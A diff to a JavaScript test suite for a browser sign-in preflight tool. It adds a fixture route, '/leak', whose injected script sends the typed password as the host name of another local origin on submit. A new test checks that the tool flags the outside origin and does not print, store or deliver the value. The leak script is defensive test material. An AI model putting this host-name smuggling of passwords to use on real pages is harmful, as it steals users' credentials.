@@ -48,7 +48,8 @@ const p03Text = (names) => `The run could not sign in to the app with the values
 // The app of the sign-in tests: a sign-in form at /sign-in that sends the reader to /orders
 // when the password is APP_SECRET, and shows the form again when it is not. /away redirects
 // to the form of another origin, the port OTHER_PORT, /link and /framed show a link to it and
-// a frame of it, and /alert shows the form with an alert at its load and at each key. The
+// a frame of it, /leak sends the password as a host name of that port at the submit, and
+// /alert shows the form with an alert at its load and at each key. The
 // other origin adds a line to the file OTHER_LOG for each request.
 const APP = `
 const fs = require('fs');
@@ -82,6 +83,12 @@ http.createServer((req, res) => {
   res.writeHead(200, { 'content-type': 'text/html' });
   if (req.url === '/link') res.end(page('<a id="go" href="' + other + '">Go</a>'));
   else if (req.url === '/framed') res.end(page('<iframe src="' + other + '"></iframe>'));
+  else if (req.url === '/leak') {
+    res.end(form(false).replace('</body>', '<script>document.forms[0].addEventListener(' +
+      '"submit", (e) => { e.preventDefault(); location.href = "http://" + ' +
+      'document.getElementById("password").value + ".localhost:' + process.env.OTHER_PORT +
+      '/"; });</script></body>'));
+  }
   else if (req.url === '/alert') {
     res.end(form(false).replace('</body>', '<script>alert("Welcome");' +
       'addEventListener("keydown", () => alert("Key"));</script></body>'));
@@ -552,6 +559,34 @@ test('preflight: a redirect, a link or a frame to another origin loads nothing t
     assert.equal(fs.readFileSync(otherLog, 'utf8'), '', words);
     assert.equal(await isFree(port), true, words);
   }
+});
+
+test('preflight: an outside origin that contains a typed value is another origin in the point and the finding', { skip: NO_BROWSER }, async () => {
+  const value = 'Parcel-Blue-41';
+  const { here, done, port, otherLog } = await signIn([{ do: 'open', url: '/leak' },
+    ...SIGN_IN.slice(1)], value);
+  assert.equal(done.status, 1);
+  assert.equal(done.findings.length, 1, done.findings.join('\n'));
+  assert.match(done.findings[0].split('\n')[1], /the page opened another origin, outside the /);
+  assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`,
+    'another origin')]);
+  const printed = [...done.findings, done.last].join('\n').toLowerCase();
+  assert.equal(printed.includes(value.toLowerCase()), false, printed);
+  const file = fs.readFileSync(path.join(here.root, 'points.json'), 'utf8').toLowerCase();
+  assert.equal(file.includes(value.toLowerCase()), false, file);
+  assert.equal(fs.readFileSync(otherLog, 'utf8'), '');
+  assert.equal(call(['check', 'points', path.join(here.root, 'points.json')],
+    { cwd: here.dir }).status, 0);
+});
+
+test('preflight: a data: address keeps data: as the origin in the point', { skip: NO_BROWSER }, async () => {
+  const { here, done, port } = await signIn([{ do: 'open', url: 'data:text/html,<p>Sign in</p>' },
+    ...SIGN_IN.slice(1)], 'parcel-blue-41');
+  assert.equal(done.status, 1);
+  assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`, 'data:')]);
+  const checked = call(['check', 'points', path.join(here.root, 'points.json')],
+    { cwd: here.dir });
+  assert.equal(checked.status, 0, checked.out);
 });
 
 test('preflight: an alert of the app does not stop the sign-in', { skip: NO_BROWSER }, async () => {
